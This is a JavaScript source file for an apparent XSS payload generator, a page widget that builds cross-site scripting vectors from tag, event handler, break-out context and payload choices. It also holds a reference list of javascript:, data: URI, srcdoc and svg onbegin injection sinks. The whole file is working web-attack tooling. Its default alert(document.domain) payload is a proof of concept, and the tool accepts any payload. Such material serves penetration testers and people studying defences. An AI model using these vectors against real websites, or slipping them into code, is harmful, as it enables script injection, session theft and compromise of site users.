(function () {
  "use strict";

  var VOID = { img: 1, input: 1, source: 1, embed: 1, keygen: 1, br: 1,
    hr: 1, area: 1, base: 1, col: 1, link: 1, meta: 1, param: 1, track: 1, wbr: 1 };

  // g: 0 = auto-fire, 1 = CSS-animation trigger, 2 = needs interaction
  var META = {
    onload:              { g: 0, rec: "svg",     tags: "svg, body, iframe" },
    onerror:             { g: 0, rec: "img",     h: { src: "x" }, tags: "img, video, audio, script, source" },
    onfocus:             { g: 0, rec: "input",   h: { autofocus: true }, tags: "input, select, textarea, button, a" },
    ontoggle:            { g: 0, rec: "details", h: { open: true }, tags: "details" },
    onpageshow:          { g: 0, rec: "body",    tags: "body" },
    onstart:             { g: 0, rec: "marquee", tags: "marquee" },
    onanimationstart:    { g: 1, rec: "div", css: 1, tags: "any styleable element" },
    onanimationend:      { g: 1, rec: "div", css: 1, tags: "any styleable element" },
    onanimationiteration:{ g: 1, rec: "div", css: 1, tags: "any styleable element" },
    onclick:             { g: 2, rec: "button", act: "a click", tags: "almost any visible element" },
    ondblclick:          { g: 2, rec: "button", act: "a double-click", tags: "almost any element" },
    onauxclick:          { g: 2, rec: "a", h: { href: "#" }, act: "a middle-click", tags: "a, button" },
    onmouseover:         { g: 2, rec: "a", h: { href: "#" }, act: "hovering the element", tags: "almost any element" },
    onmouseenter:        { g: 2, rec: "div", act: "hovering the element", tags: "almost any element" },
    onmousemove:         { g: 2, rec: "div", act: "moving the mouse over it", tags: "almost any element" },
    onpointerover:       { g: 2, rec: "div", act: "hovering / tapping it", tags: "almost any element" },
    onpointerdown:       { g: 2, rec: "div", act: "a tap / click", tags: "almost any element" },
    onkeydown:           { g: 2, rec: "input", h: { autofocus: true, tabindex: "1" }, act: "a keypress (element is auto-focused)", tags: "input, textarea, body" },
    onkeyup:             { g: 2, rec: "input", h: { autofocus: true, tabindex: "1" }, act: "a keypress (element is auto-focused)", tags: "input, textarea, body" },
    oninput:             { g: 2, rec: "input", act: "typing in the field", tags: "input, textarea" },
    onchange:            { g: 2, rec: "input", act: "changing the field", tags: "input, select, textarea" },
    onwheel:             { g: 2, rec: "body", act: "scrolling the wheel over it", tags: "body, div" },
    onscroll:            { g: 2, rec: "body", act: "scrolling", tags: "body, div (overflow)" },
    oncopy:              { g: 2, rec: "body", act: "copying page text", tags: "body" },
    onpaste:             { g: 2, rec: "body", act: "pasting into a field", tags: "body, input" },
    ondrag:              { g: 2, rec: "a", h: { draggable: "true" }, act: "dragging the element", tags: "a, img, div" },
    oncontextmenu:       { g: 2, rec: "div", act: "a right-click", tags: "almost any element" }
  };

  var GROUPS = [
    ["Auto-fires (no interaction)", ["onload", "onerror", "onfocus", "ontoggle", "onpageshow", "onstart"]],
    ["CSS trigger (fires on render)", ["onanimationstart", "onanimationend", "onanimationiteration"]],
    ["Needs interaction", ["onclick", "ondblclick", "onauxclick", "onmouseover",
      "onmouseenter", "onmousemove", "onpointerover", "onpointerdown", "onkeydown",
      "onkeyup", "oninput", "onchange", "onwheel", "onscroll", "oncopy", "onpaste",
      "ondrag", "oncontextmenu"]]
  ];

  var EXPAND = [
    ["Auto-fires - no interaction", [
      ["onload", ["svg", "body", "iframe"]],
      ["onerror", ["img", "video", "audio", "script"]],
      ["onfocus", ["input", "select", "textarea", "button", "keygen"]],
      ["ontoggle", ["details"]],
      ["onpageshow", ["body"]],
      ["onstart", ["marquee"]]
    ]],
    ["CSS animation - fires on render", [
      ["onanimationstart", ["xss", "div", "a", "marquee"]],
      ["onanimationend", ["xss", "div"]],
      ["onanimationiteration", ["xss", "div"]]
    ]],
    ["Needs interaction", [
      ["onclick", ["a", "button", "div", "p", "svg"]],
      ["ondblclick", ["div", "button"]],
      ["onmouseover", ["a", "div", "svg", "body"]],
      ["onmouseenter", ["div", "a"]],
      ["onmousemove", ["div", "body"]],
      ["onpointerover", ["div", "a"]],
      ["onpointerdown", ["div", "a"]],
      ["onkeydown", ["input", "textarea"]],
      ["onkeyup", ["input", "textarea"]],
      ["oninput", ["input", "textarea"]],
      ["onchange", ["input", "select", "textarea"]],
      ["onwheel", ["body", "div"]],
      ["onscroll", ["body", "div"]],
      ["oncopy", ["body"]],
      ["onpaste", ["body", "input"]],
      ["oncontextmenu", ["div", "body"]],
      ["ondrag", ["a", "div"]]
    ]]
  ];

  var SPECIAL = [
    ["<svg><script>alert(document.domain)</script></svg>", "svg > script (script inside svg)"],
    ["<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>", "svg <animate> onbegin"],
    ["<svg><set onbegin=alert(document.domain) attributeName=x to=1 dur=1s>", "svg <set> onbegin"],
    ["<a href=javascript:alert(document.domain)>click</a>", "javascript: URI in href"],
    ["<iframe src=javascript:alert(document.domain)>", "javascript: URI in iframe src"],
    ["<iframe srcdoc=\"<script>alert(document.domain)</script>\">", "iframe srcdoc (HTML injection)"],
    ["<object data=javascript:alert(document.domain)>", "object data javascript:"],
    ["<form action=javascript:alert(document.domain)><button>submit</button></form>", "form action javascript:"],
    ["<button formaction=javascript:alert(document.domain)>submit</button>", "button formaction javascript:"],
    ["<input type=image formaction=javascript:alert(document.domain) src=x>", "input image formaction"],
    ["<base href=javascript:alert(document.domain)//>", "base href javascript:"],
    ["<meta http-equiv=refresh content=\"0;url=javascript:alert(document.domain)\">", "meta refresh javascript:"],
    ["<iframe src=\"data:text/html,<script>alert(document.domain)</script>\">", "iframe data: URI (HTML)"],
    ["<script src=data:,alert(document.domain)></script>", "script data: URI src"]
  ];

  var CTX = [
    ["", "none (clean HTML sink)"],
    ['">', 'break out of "double-quoted" attribute'],
    ["'>", "break out of 'single-quoted' attribute"],
    [">", "break out of unquoted attribute"],
    ["</textarea>", "close a <textarea> block"],
    ["</title>", "close a <title> block"],
    ["</style>", "close a <style> block"],
    ["</script>", "close a <script> block"],
    ["</noscript>", "close a <noscript> block"],
    ["-->", "close an HTML <!-- comment -->"]
  ];

  var tagSel = document.getElementById("xgTag");
  var evSel = document.getElementById("xgEvent");
  var plIn = document.getElementById("xgPayload");
  var ctxSel = document.getElementById("xgCtx");
  var helper = document.getElementById("xgHelper");
  var out = document.getElementById("xgOut");
  var statusEl = document.getElementById("xgStatus");
  var works = document.getElementById("xgWorks");
  var ref = document.getElementById("xgRef");
  if (!tagSel || !evSel) return;

  var TAGS = ["svg", "img", "body", "iframe", "input", "video", "audio",
    "source", "details", "select", "textarea", "button", "a", "marquee",
    "div", "p", "object", "embed", "math", "style", "xss", "keygen",
    "canvas", "form", "table"];

  function opt(val, label) {
    var o = document.createElement("option");
    o.value = val; o.textContent = label;
    return o;
  }

  TAGS.forEach(function (t) { tagSel.appendChild(opt(t, t)); });
  GROUPS.forEach(function (gr) {
    var og = document.createElement("optgroup");
    og.label = gr[0];
    gr[1].forEach(function (ev) { og.appendChild(opt(ev, ev)); });
    evSel.appendChild(og);
  });
  CTX.forEach(function (c) { ctxSel.appendChild(opt(c[0], c[1])); });

  evSel.value = "onload";
  tagSel.value = "svg";

  function isVoid(t) { return !!VOID[t]; }

  function q(p) {
    if (/[\s>"'`=]/.test(p)) {
      if (p.indexOf('"') < 0) return '"' + p + '"';
      if (p.indexOf("'") < 0) return "'" + p + "'";
    }
    return p;
  }

  function makeVector(tag, ev, pl, ctx, helperOn) {
    var m = META[ev] || { g: 2 };
    var prefix = ctx || "";
    var attrs = [];
    if (helperOn && m.h) {
      Object.keys(m.h).forEach(function (k) {
        var v = m.h[k];
        attrs.push(v === true ? k : k + "=" + v);
      });
    }
    var attrStr = attrs.length ? " " + attrs.join(" ") : "";
    var evPart = " " + ev + "=" + q(pl);

    if (m.css) {
      var openA = "<" + tag + attrStr + ' style="animation-name:x"' + evPart + ">";
      return prefix + "<style>@keyframes x{}</style>" + openA + (isVoid(tag) ? "" : "</" + tag + ">");
    }
    var openB = "<" + tag + attrStr + evPart + ">";
    if (isVoid(tag)) return prefix + openB;
    var inner = (m.g === 2) ? "XSS" : "";
    return prefix + openB + inner + "</" + tag + ">";
  }

  function build() {
    var tag = tagSel.value;
    var ev = evSel.value;
    var pl = (plIn.value || "").trim() || "alert(document.domain)";
    var m = META[ev] || { g: 2, tags: "" };
    var vec = makeVector(tag, ev, pl, ctxSel.value, helper.checked);

    out.innerHTML = "";
    var d = document.createElement("div");
    d.className = "cmd plain";
    d.dataset.tpl = vec;
    out.appendChild(d);
    if (window.TN) window.TN.renderTpls(out);

    if (m.g === 0) {
      statusEl.textContent = "Fires automatically on load.";
      statusEl.className = "xgstatus ok";
    } else if (m.g === 1) {
      statusEl.textContent = "Fires on render via CSS animation (no interaction).";
      statusEl.className = "xgstatus ok";
    } else {
      statusEl.textContent = "Requires " + (m.act || "user interaction") + ".";
      statusEl.className = "xgstatus warn";
    }
    works.textContent = m.tags ? ("event also works on: " + m.tags) : "";
  }

  function addEntry(parent, vec, label) {
    var d = document.createElement("div");
    d.className = "cmd plain";
    d.dataset.tpl = vec;
    d.dataset.search = (label + " " + vec).toLowerCase();
    var s = document.createElement("span");
    s.className = "lbl";
    s.textContent = label;
    d.appendChild(s);
    parent.appendChild(d);
  }

  function renderRef() {
    if (!ref) return;
    var DP = "alert(document.domain)";
    EXPAND.forEach(function (group) {
      var wrap = document.createElement("div");
      wrap.className = "xgcat-wrap";
      var h = document.createElement("h4");
      h.className = "xgcat";
      h.textContent = group[0];
      wrap.appendChild(h);
      group[1].forEach(function (pair) {
        var ev = pair[0];
        pair[1].forEach(function (tag) {
          addEntry(wrap, makeVector(tag, ev, DP, "", true), ev + "  <" + tag + ">");
        });
      });
      ref.appendChild(wrap);
    });
    var sw = document.createElement("div");
    sw.className = "xgcat-wrap";
    var sh = document.createElement("h4");
    sh.className = "xgcat";
    sh.textContent = "URI / nested / attribute sinks";
    sw.appendChild(sh);
    SPECIAL.forEach(function (p) { addEntry(sw, p[0], p[1]); });
    ref.appendChild(sw);

    if (window.TN) window.TN.renderTpls(ref);
  }

  function wireFilter() {
    var f = document.getElementById("xgFilter");
    if (!f || !ref) return;
    f.addEventListener("input", function () {
      var qy = f.value.trim().toLowerCase();
      ref.querySelectorAll(".xgcat-wrap").forEach(function (w) {
        var any = false;
        w.querySelectorAll(".cmd").forEach(function (c) {
          var show = !qy || (c.dataset.search || "").indexOf(qy) > -1;
          c.hidden = !show;
          if (show) any = true;
        });
        w.hidden = !any;
      });
    });
  }

  evSel.addEventListener("change", function () {
    var m = META[evSel.value];
    if (m && m.rec) tagSel.value = m.rec;
    build();
  });
  tagSel.addEventListener("change", build);
  ctxSel.addEventListener("change", build);
  helper.addEventListener("change", build);
  plIn.addEventListener("input", build);
  document.querySelectorAll(".xssgen .tok[data-pl]").forEach(function (b) {
    b.addEventListener("click", function () { plIn.value = b.dataset.pl; build(); });
  });
  document.addEventListener("tn:vars", function () {
    if (out.firstChild) build();
    if (ref && window.TN) window.TN.renderTpls(ref);
  });

  build();
  renderRef();
  wireFilter();
})();
